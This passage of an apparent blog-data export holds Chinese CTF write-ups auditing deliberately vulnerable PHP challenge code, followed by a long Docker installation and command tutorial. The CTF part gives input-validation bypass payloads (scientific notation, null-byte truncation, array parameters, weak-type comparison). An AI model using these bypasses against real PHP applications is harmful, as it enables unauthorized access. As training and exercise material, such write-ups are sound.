9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; 代码审计：ereg()函数搜索一个字符串中的指定字符串，成功true，错误false 传入的值必须是数字或大小写字符 传入的值长度小于8，但要大于9999999 长度和数值矛盾，采用1e8,1x10的8次方，绕过 在可以看到题目是%00截断绕过，可以构造一下payload查看能否返回 没有找到* - *。。。将 - 替换为 * - *试试 这样页面就成功的返回了flag了 strpos数组绕过1234567891011&lt;?php$flag = \"flag\";if (isset ($_GET['ctf'])) &#123;if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; 代码审计：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。所以输入的内容不能是正则中的内容。结合题目是数组绕过，所以跟之前的数组绕过一样，这里等号后面可以跟任何内容 这样进行数组绕过就成功的返回了flag 数字验证正则绕过12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (\"POST\" == $_SERVER['REQUEST_METHOD'])&#123; $password = $_POST['password'];//1、正则匹配，[:graph:]为任意字符，要求password长度超过12 if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))&#123; echo 'flag'; exit;&#125;while (TRUE)&#123;//2、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过6次 $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break;//c为字符种类， $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]]任何大写字母 [[:lower:]] 任何小写字母//标点符号，数字，大写字母，小写字母，包含3种以上绕过 foreach ($ps as $pt)&#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上//4、弱类型比较，42abc,强制转换为数字 if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit;&#125;&#125;?&gt; preg_match() 定义： 执行一个正则表达式匹配 语法：preg_math（pattern,string,matches,flags） pattern,必需，要搜索的模式 string,必需，输入的字符串 返回pattern的匹配次数，0次（不匹配）或1次，匹配成功第一次就会停止搜索。 preg_match_all() 与preg_match的区别： 返回匹配完整次数（可能是0），或者发生错误后返回FALSE，匹配完整个字符串。 名字 ASCII [:alnum:] [a-zA-Z0-9] [:alpha:] [a-zA-Z] [:ascii:] [\\x00-\\x7F] [:blank:] [ \\t] [:digit:] [0-9] [:graph:] [\\x21-\\x7E] [:punct:] [!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~] [:lower:] [a-z] [:upper:] [A-Z] [:word:] [A-Za-z0-9_] [:xdigit:] [A-Fa-f0-9] 这一关有bug就算只输入?password=都能返回flag 只要能够满足条件都行，是Post传参 payload:42ccccccc.ffffffF 简单的waf打不开","categories":[],"tags":[]},{"title":"docker","slug":"docker","date":"2020-07-25T01:16:30.193Z","updated":"2020-07-21T07:39:49.932Z","comments":true,"path":"2020/07/25/docker/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/docker/","excerpt":"","text":"docker功能描述第一步，查看内核版本，目前Docker最支持Centos7，需要安装在64位的平天上并且内核版本需要高于3.10。检查内核版本的命令如下。 uname -r命令查看系统内核版本 docker version命令实现安装验证及版本查看 第二步，使用脚本自动安装Docker。脚本会自动将Docker依赖环境配置完成，并在系统中进行Docker的安装。由于Docker的软件园在国外，下载会有延迟，很有可能因为网络环境导致下载错误。为避免发生错误，可以使用国内的软件源镜像安装，比如使用阿里云安装使用DaoCloud安装 123456&#x2F;&#x2F; 使用脚本自动安装Dockercurl -sSL https:&#x2F;&#x2F;get.docker.com&#x2F;1 sh &#x2F;&#x2F; 使用阿里云安装Dockercurl -sSL http:&#x2F;&#x2F;acs-public-mirror.oss-cn-hangzhou.aliyuncs.com&#x2F;docker-engine&#x2F;intemet | sh&#x2F;&#x2F; 使用DaoCloud安装Dockercurl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh 安装完成后，使用docker --version来查看docker版本 当前Docker版本为17.12 第三步，当Docker的版本较低需要升级时，先卸载旧版本在下载新版本。卸载旧版本时需要旧版本Docker的全名(包含版本号)。查看Docker安装包列表的命令如下 12&#x2F;&#x2F; 查看Docker安装包列表yum list installed | grep docker 然后使用安装包的名称删除Docker，命令如下所示。 12&#x2F;&#x2F; 使用安装包的名称删除Dockersudo yum -y remove docker-ce.x86_64 安装包删除完成后，可以通过查看版本号的命令判断是否删除成功 最后使用Docker安装新版本，即可实现Docker版本的更新。 由于Docker在Linux的CentOS操作系统中使用量最大，尽管使用yum进行Docker 的安装相较于使用脚本安装有些复杂，但不可否认的是，使用yum进行安装是一个不错的 选择，可通过以下几个步骤实现Docker在CentOS中的环境安装。 第一步，与使用脚本安装相同，需要进行内核版本的检测。 第二步，安装系统工具，为Docker安装做准备，命令如下 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 第三步，安装软件源信息，命令如下所示 sudo yum-config-manager -add-repo https://download.docker.com/linux/centos/dock er-ce.repo 第四步，更新yum缓存 sudo yum makecache fast 第五步，查看仓库中包含的Docker版本，选择特定版本安装 yum list docker-ce —showduplicates | sort -r 第六步，使用yum进行Docker的安装 sudo yum install docker-ce 如果想安装指定的版本 sudo yum install docker-ce-17.12.0.ce 第七步，启动Docker服务 sudo systemctl start docker 第八步，启动Docker服务后，可以通过查看Docker版本信息确保服务正常运行。 docker version 第九步，测试Docker,并输出”hello world docker run hello-world Docker安装完成 Docker镜像使用Docker镜像操作 在Docker中，镜像是必不可少的，是创建Docker容器的基础。Docker提供了很多用于镜像操作的命令，包含镜像的查找、构建、删除等。 docker和虚拟机的特点 docker的常用命令docker帮助命令docker version 查看信息 docker info 查看详细信息 docker –help 帮助命令 uname -r 查看内核版本 镜像操作命令 命令 描述 docker pull 拉去镜像 docker images 查看镜像信息 docker tag 设置镜像标签 docker search 查找镜像 docker rmi 删除镜像 docker save 导出镜像 docker load 载入镜像 docker push 上传镜像 （1） docker pull 下载镜像在 Docker中，没有镜像容器无法被启动。通过“docker pull”命令即可实现镜像的拉去。“docker pull”命令包含的部分参数 参数 描述 -a 拉去所有lagged镜像 -disable-content-trust 忽略 目前，镜像可以从以下两个地方拉取。 查看当前存在什么镜像 docker images ① 从Docker Hub(官方仓库)中拉取镜像。 123456&#x2F;&#x2F; 拉取ubuntu镜像docker pull ubuntu&#x2F;&#x2F; docker pull ubuntu:TAG ，如果省略TAG拉取的就是最新版，当然也可以定义TAG版本&#x2F;&#x2F; 比如将TAG写成3.2也就是也就是拉取的是ubuntu3.2版本docker pull ubuntu:3.2 对Docker镜像来说，当不指定标签时，默认下载最新的版本“latest”标签。 使用docker images查看是否已经拉取成功ubuntu ② 从私有仓库中拉取镜像，需要使用镜像的完整路径。 docker pull 192.168.1.101:5000/public/ubuntu:14.04 (2) docker images 查看镜像信息​ “docker images”是查看镜像信息的命令，可以将本地主机上已有镜像的基本信息全部 列出来，还可以用于判断镜像是否拉取成功。在使用”dockerimages”命令查看镜像信息时, 可以通过加入一些参数实现条件查询 “docker images”命令包含的部分参数 参数 描述 -a 列出本地所有的镜像(含中间影响层，在默认情况下过滤掉中间映像层) –digests 显示镜像的摘要信息 -f 显示满足条件的镜像 –format 指定返回值的模块文件 –no-trunc 显示完整的镜像信息 -q 只显示镜像的ID 使用“docker images”查询镜像信息 123456&#x2F;&#x2F; 查看全部镜像的基本信息docker images&#x2F;&#x2F; 查看镜像的摘要信息docker images --digests&#x2F;&#x2F; 查看镜像的完整信息docker images --no-trunc 12&#x2F;&#x2F; 只显示镜像的IDdocker images -q 使用“docker images”命令查看到的基本信息字段及其代表的意义 字段 意义 REPOSITORY 来自哪个仓库 TAG 镜像标签信息 IMAGE ID 镜像的ID，是镜像的唯一表示。ID相同，说明两个镜像目前指向同一个镜像 GREATED 镜像的创建时间 SIZE 镜像的大小 （3）docker tag 设置标签“docker tag”命令主要用于设置镜像标签。当一个镜像被使用时，如果另一个项目同样需要使用这个镜像，为了区分镜像主要针对哪个项目，可以通过设置镜像标签来解决这个问题。 docker tag cenots centos01 （4）docker search 查看镜像版本“docker search”命令用于查找镜像。当想拉去一个镜像，却不知道有什么版本时，可以使用查找镜像的命令。在查找镜像时，先从本地查找，然后是本地仓库，最后Docker Hub仓库。 “docker search”命令包含的部分参数 参数 描述 –automated 只列出automated build类型的镜像 –no-trunc 显示完整的镜像描述 -s 累出收藏数不小于指定值的镜像 使用“docker search”命令查找centos的相关镜像 docker search centos 查找tomcat相关镜像 docker search tomcat 加上-s筛选收藏度大于等于30的镜像 docker search -s 30 tomcat 显示完整说明 docker search -s 30 --no-trunc comcat （5）docker rmi 删除镜像“docker rmi”命令用于删除镜像。docker中，删除镜像有两种方法：一种是使用镜像的ID删除，另一种是使用仓库名称和标签名称的组合删除。 使用“docker rmi”命令只能删除不处于工作状态的镜像,如果删除运行容器的镜像, Docker会提示有容器正在运行,无法删除。 如果想删除这个镜像，有两种方式:第一种是使用强行删除命令,只需在删除命令中添 加“-f”参数即可;第二种是先删除依赖的所有容器，再使用删除命令。 “docker rmi” 命令包含的部分参数 参数 描述 -f 强制删除 -no-prune 不移除镜像的过程镜像，默认移除 加参数-f是 删除单个镜像id 之前有的镜像 使用“ docker rmi”命令删除镜像 12删除ID为“hello-world”的镜像docker rmi hello-world 报错了，必须强制，也就是让我们强制删除 使用docker rmi -f hello-world 删除多个镜像id 查看当前镜像 进行多个删除 如果是想要将其全部删除 使用docker rmi -f $(docker images -qa)这个命令删除全部镜像 （6）docker save“docker save”命令主要用于导出镜像。使用“docker save”命令加入“-o”参数即可将镜 像以压缩文件的形式导出到本地，之后如果想分享该镜像，只需复制压缩文件即可。 12〃导岀“ubuntu:Iatest”镜像,“-o”参数表示输出到的文件docker save -o ubuntu latest.tar ubuntu:latest （7）docker load“docker load”是载入镜像命令。导出镜像是将镜像拿出来，而载入镜像是将镜像放进 去。通过载入镜像命令，导出的压缩文件可以再次导入本地镜像中。 “docker load”命令包 含的部分参数 参数 描述 –input,-i 从tar压缩文件中读取 –quiet,-q 抑制负载输出 使用“ docker load ”命令载入镜像。 12&#x2F;&#x2F; 载入&quot;ubuntu_latest.tar&quot;镜像 docker load —input ubuntu_latest.tar 为了更直观地看到效果，先将”ubuntu:latest”镜像删除 然后运行载入镜像命令 （8）docker push “docker push”命令用于上传镜像，可以将本地镜像上传到仓库中,在默认情况下会将镜 像上传到Docker Hub官方仓库。 Docker容器操作1、Docker容器简介Docker容器是一个开源的容器引擎，允许开发人员将应用以及依赖项打包到一个可移植的容器中，然后发布到任何运行的linux上。容器采用沙箱机制，彼此没有任何借口，很容易在及其和数据中心运行。最重要的是，他们不依赖于任何语言、框架(包括系统)。 虽然Docker容器与其他容器技术相似，但Docker是将关键的应用程序组件捆绑在一个容器中，允许容器在不同的平台和云计算之间移植，因此Docker容器是需要跨多个不同的环境运行的应用程序的理想选择。 注意：容器由创建时给出的镜像和配置项定义，当容器被删除是，其所有未被持久存储的状态变化都会丢失。 2、Docker容器操作​ 在Docker中，容器与镜像在结构上大致相同，基本操作也相差不大，唯一的不同就是镜像可以直接拉取，而容器需要创建。 容器的相关命令 命令 描述 docker create 创建容器 docker ps 查看容器信息 docker start 启动容器 docker run 创建并启动容器 docker stop 停止容器 docker restart 重启容器 docker rm 删除容器 docker export 导出容器 docker import 导入容器 docker commit 创建新镜像 docker cp 在容器和本地文件之间复制文件/文件夹 在使用容器之前，需要事先拉取镜像，如果没有拉取镜像就直接使用，会默认从Docker官方镜像仓库中加载，然后才能通过以上的相关命令实现容器的操作。 新建并启动容器docker run 运行容器 OPTIONS：选项参数 --name=&quot;容器新名字&quot;：为容器指定一个名称 -d：后台运行容器，并返回容器ID，也即启动守护式容器； -i：以交互模式运行容器，通常与与-t同时使用；可以理解为(我登录进docker里面这个centos容器以后，要跟你交互) -t：为容器重新分配一个伪输入重点，通常与-i同时使用。可以理解为（登录进去后弹出一个可以输入命令的伪终端） -P：随机端口映射； -p：指定端口映射，有以下四种格式 ip:hostPort:containerPort ip::containerPort hostPort:containerPort containerPort 123456789- IMAGE：镜像- COMMAND：命令&#96;docker run [OPTIONS] IMAGE [COMMAND] [ARG...]&#96;例如运行centos，如果本地有centos镜像就直接新建运行，如果本地没有centos那就会拉取新建运行先不加--name // 生成了实例，并登陆到了docker里面的centos docker run -it [IMAGE ID] docker交互运行要有一个控制台，linux控制台一般都在bin下面的。默认进入bashdocker run -it centos /bin/bash 可以看到以下图面之前的命令行提示符是还在之前的宿主机里面，使用docker run命令后变成了a97229a12b57，意思就是登陆了docker中的centos了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647![image-20200507164617143](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507164617143.png)![image-20200707143114453](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707143114453.png)使用&#96;--name&#96;参数进行重命名&#96;docker run -it --name mycentos1 centos&#96;![image-20200507173747984](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507173747984.png)##### 退出容器exit：容器停止退出ctrl+p+q：离开容器，但不停止使用&#96;ctrl+p+q&#96;离开容器但是并不是关闭在使用&#96;docker ps&#96;可以看到STATUS前面是UP![image-20200507185047248](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507185047248.png)##### docker create 创建容器“docker create”命令用来创建容器。创建容器时，只需要在“docker create”命令后面加上镜像的名称和标记即可，但使用“docker create”命令创建的容器是处于静止状态的。“docker create”命令包含的部分参数| 参数 | 描述 || ----------------- | ----------------------------------------------------------- || -a stdin | 指定标准输入输出内容类型，可选STDIN、STDOUT、STDERR三项之一 || -d | 后台运行容器，并返回容器的ID || -i | 以交互模式运行容器，通常与-t同时使用 || -t | 为容器重新分配一个伪输入终端，通常与-i同时使用 || --name&#x3D;&quot;nginx-lb&quot; | 为容器指定一个名称 || --volume，-v | 绑定一个卷 || --volume-driver | 容器的可选卷驱动程序 || --volumes-from | 从指定容器装载卷 || --publish，-p | 将容器的端口发布到主机 || --publish-all，-P | 将所有公开的端口发布到随机端口。 || --network | 将容器连接到网络 || --link | 添加链接到另一个容器 || --ip | IPv4地址 || --detach，-d | 在后台运行容器并打印容器的ID |使用“docker create”命令常见容器 //“it”参数为”-i”和”-t”的组合docker create -it ubuntu:latest 1234567891011121314151617181920212223242526272829##### docker ps 查看容器信息“docker ps”是查看容器信息的命令，可以将所有容器的相关信息以列表的形式显示出来，包含容器的名称、ID等信息。单纯地使用“docker ps”命令可以查看当前正在运行的相关容器信息；如果想针对不同的情况去查询相关容器，可以再“docker ps”命令后加一些参数可以使用exit退出容器OPTIONS说明（常用）- -a：列出当前所有正在运行的容器+历史上运行过的- -i：显示最近创建的容器。- -n：显示最近n个创建的容器。- -q：静默模式，只显示容器编号。- --no-trunc：不截断输出“docker ps [OPTIONS]”命令包含的常用参数| 参数 | 描述 || ---------- | ----------------------------------------- || -a | 列出当前所有正在运行的容器+历史上运行过的 || -f | 根据条件过滤显示的内容 || --format | 指定返回的模板文件 || -l | 显示最近创建的容器 || -n | 列出最近创建的n个容器 || --no-trunc | 不截断输出 || -q | 静默模式，只显示容器的编号 || -s | 显示总的文件大小 |使用“docker ps参数查看docker运行的进程 docker ps 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566![image-20200507170424573](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507170424573.png)使用&#96;docker ps -a&#96;显示所有容器，包括未运行的容器![image-20200507172414774](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507172414774.png)使用“docker ps -a”命令查看到的基本信息字段及其代表的意义| 字段 | 意义 || ------------- | ----------- || CONTAINER ID | 容器的ID || IMAGE | 镜像的名称 || COMMAND | command命令 || CREATED | 创建时间 || STATUS | 容器的状态 || PORTS | 端口号 || NAMES | 容器的名称 |使用&#96;docker ps -lq&#96;只显示容器编号![image-20200507171836778](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507171836778.png)##### docker start 开启容器使用docker start将没开启的容器进行开启，开启之后STATUS就会在前面加上UP![image-20200507190129849](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190129849.png)##### docker restart 重启容器格式：&#96;docker restart 容器ID&#96;![image-20200507190715336](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190715336.png)##### docker stop 停止容器格式：&#96;docker stop 容器ID&#96;![image-20200507191101140](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191101140.png)##### docker kill 强制关闭格式：&#96;docker kill 容器ID&#96;![image-20200507191633590](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191633590.png)##### docker rm 删除容器格式&#96;docker rm 容器ID&#96;如果现实在运行中加&#96;-f&#96;参数强制删除，如：&#96;docker rm -f 容器ID&#96;##### 注意：docker rm(没有i)是删除容器。docker rmi(有i)是删除镜像。一定要区分![image-20200507192219692](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507192219692.png)##### docker rm $(docker ps -aq) ##### docker ps -aq | xargs docker rm // 查找所有运行和停止的容器，然后将这些信息传递到xargs然后docker rm 进行删除docker ps -aq | xargs docker rm 1234这两个都是 一次性删除多个容器其中第二个中的&#96;xargs&#96;命令的作用，是将标准输入转为命令行参数。 例如： $ echo “hello world” | xargs echo含义：将管道左侧的标准输入，转为命令行参数hello world，传给第二个echo命令。也就是，上一个命令的结果集作为输入参数传给管道后的下一个参数 123456789101112131415161718192021222324252627282930313233##### docker run -d 容器名后台运行容器，并返回容器的ID![image-20200507211155631](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507211155631.png)使用镜像centos：latest以后台模式启动一个容器&#96;docker run -d centos&#96;问题：使用&#96;docker ps -a&#96;进行查看，会发现容器已经退出很重要的要说明的一点：**Docker容器宏图爱运行，就必须有一个前台进程。**容器运行的命令如果不是那些**一直挂起的命令（比如运行top、tail）**，就会自动退出的。这个是docker的机制问题，比如你的web容器，我们以nginx为例，正常情况下，我们配置启动服务只需要启动相应的service即可。即可。例如：service nginx start但是，这样做nginx为后台进程模式运行，就导致docker前台没有运行的应用。这样的容器后台启动后，会立即自杀因为他觉得他没事可做了，所以，最佳的解决方案的是，将你要运行的程序以前台进程的形式运行**说白了前台启动用&#96;-it&#96;会返回给你一个自身容器的id编号的终端。 使用&#96;-d&#96;以后台模式启动容器**##### &#96;docker logs -f -t --tail 容器ID&#96; 查看容器日志- -t：是加入时间戳- -f：跟随最新的日志打印- --tail [数字]：显示最后多少条- -tf：显示全部日志 // docker run -d centos以后台的形式运行centos// /bin/sh -c “while true;do echo hello world;循环的打印hello world// sleep 2;done”每2秒打印这句话因为while是true死循环一直循环说白了就是我要把这个输出打印到控制台上，这样就会导致前台有响应，这样后台启动的话docker也不会自我关闭docker run -d centos /bin/sh -c “while true;do echo hello world;sleep 2;done” 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182运行一下试试，先试用&#96;docker ps&#96;查看当前是否有运行的容器![image-20200508205354753](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205354753.png)运行上面的Linux Shell编程，然后再使用docker ps查看结果&#96;docker run -d centos &#x2F;bin&#x2F;sh -c &quot;while true;do echo hello world;sleep 2;done&quot;&#96;状态返回了UP，说明运行成功![image-20200508205512712](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205512712.png)虽然后台启动了，但不想有一个交互窗口，还是想在自己的宿主机，但是不能表示程序不能在后台安静的运行。此时就要看看&#96;docker logs 容器ID&#96;的日志，每隔两秒钟打印一个hello world后台有个程序跑着![image-20200508210007228](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508210007228.png)使用&#96;docker logs -tf 容器ID&#96;将时间戳打印，不停地追加(更新日志)。![image-20200508211210344](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211210344.png)使用&#96;docker logs -tf --tail 3 容器ID&#96;将时间戳打印，不停地追加(更新日志)，并且只显示最后三条(--taile后面跟了数字3)，但是因为加了-f所以一直在追加。![image-20200508211149440](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211149440.png)##### top 查看容器内运行的进程&#96;top&#96;命令式查看linux的进行，而查看docker容器的进程就使用&#96;docker top 容器ID&#96;为什么docker可以使用&#96;top&#96;，因为可以将docker看做是一个简易版的linux环境![image-20200508211740262](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211740262.png)##### docker inspect 查看容器内部细节docker镜像是一层套一层就像一个同心圆一样，所以说&#96;inspect&#96;查看容器内部细节，意思就是描述整个容器，以一个阶层串的形式嵌套的形式描述告诉你容器全部的结构细节&#96;docker inspect 容器ID&#96;![image-20200508221907314](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508221907314.png)这个就是输出打印的内容![image-20200508222052594](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508222052594.png)只是整个id中的前几位![image-20200707193523775](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707193523775.png)##### docker exec -it 容器ID &#x2F;bin&#x2F;bash 进入正在运行的容器并以命令行交互&#96;docker exec -it 容器ID &#x2F;bin&#x2F;bash&#96;重新进入&#96;docker attach 容器ID&#96;&#96;docker attach&#96;例：① 先使用&#96;docker run -it centos&#96;以交互模式创建一个伪终端(centos)② 再&#96;ctrl+p+q&#96;切换到宿主机③ 使用&#96;docker attach 容器ID&#96;重新进入这个容器![image-20200508235922305](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508235922305.png)&#96;docker exec -it 容器ID bashShell&#96;例：使用这个命令直接在宿主机就可以使用centos中&#96;ls -l&#96;命令查看tmp文件下的内容，而本身并没有进入容器中![image-20200509000527519](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000527519.png)而&#96;docker exec&#96;可以和&#96;attach&#96;一样进入容器，它的功能比&#96;attach&#96;强大。① 可以不进入容器直接在宿主机使用&#96;docker exec&#96;进行centos命令的使用。② 也可以和&#96;docker attach&#96;一样进入容器 docker exec # 进入容器后开启一个新的终端，可以在里面操作（常用）docker attach # 进入容器 正在执行的终端，不会启动新的进程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233![image-20200509000851503](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000851503.png)##### docker cp 容器ID:容器内路径 目的主机路径 从容器内拷贝文件到主机上&#96;docker cp 容器ID:容器内路径 目的主机路径&#96;现在容器的tmp文件下新建一个111.txt文件夹，内容This is a my first code![image-20200509002902272](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509002902272.png)切换回宿主机，查看当前root下是否有111.txt，其中并没有111.txt![image-20200509003001581](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003001581.png)使用&#96;docker cp 容器ID:路径 宿主机路径&#96;，然后使用&#96;ll&#96;查看当前路径下是否成功复制了111.txt并查看其内容。这样就成功将docker容器中的111.txt成功复制到宿主机上了![image-20200509003121627](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003121627.png)#### docker镜像docker镜像是什么？镜像是一种轻量级、可执行的独立软件包，**用来打包软件运行环境和基于运行环境开发的软件**，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。- UnionFS（联合文件系统）- Docker镜像加载原理- 分层镜像- 为什么Docker镜像要采用这种分层结构如何得到镜像：- 从远程仓库下载- 朋友拷贝给你- 自己制作一个镜像DockerF ile##### UnionFS（联合文件系统）UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层，轻量级并且高性能的文件系统，它支持**对文件系统的修改作为一次提交来一层一层的叠加**，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directiories into a single virtual file system）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。##### Docker镜像加载原理docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。botfs(boot file system)主要包含bootloader和kernel, botloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，**在Docker镜像的最底层是bootfs**。这- -层 与我们典型的Linux&#x2F;Unix系统是- -样的，包含boot加戟器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由botfs转交给内核，此时系统也会卸载botfs。rootfs (root file system)，在botfs之上.包含的就是典型Linux系统中的&#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标准目录和文件。roots就是各种不同的操作系统发行版，比如Ubuntu, Centos 等等。![image-20200509171839224](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171839224.png)平时我们安装进虚拟机的Centos都是好几个G，为什么docker这里才200M![image-20200509171940133](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171940133.png)##### 分层的镜像对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。由此可见对于不同的linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。##### 为什么Docker镜像要采用这种分层结构呢最大的一个好处就是-共享资源比如：有多个镜像都从相同的base镜像构建而来，那么宿主机只需要在磁盘上保存一份base镜像，同时内存中只需加载一份base镜像，就可以为所有容器服务了，而且镜像的每一层都可以共享。![image-20200509174120126](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509174120126.png)##### 理解：所有的Docker镜像都起始于一个基础镜像层 。当进行修改或增加新的内容时。就会在当前镜像层之上,创建新的镜像层。举一个简单的例子,假如基于Ubuntu Linux 16.04创建一个新的境像 ,这就是新镜像的第-层;如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层;如果继续添加一个安全补丁,就会创建第三个镜像层。该镜像当前已经包含3个镜像层,如下图所示(这只是一个用于演示的很简单的例子).![image-20200709101536512](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101536512.png)在添加额外的境像屈的同时。镜像始终保持是当前所有镜像的组合。理解这一点非常重要。 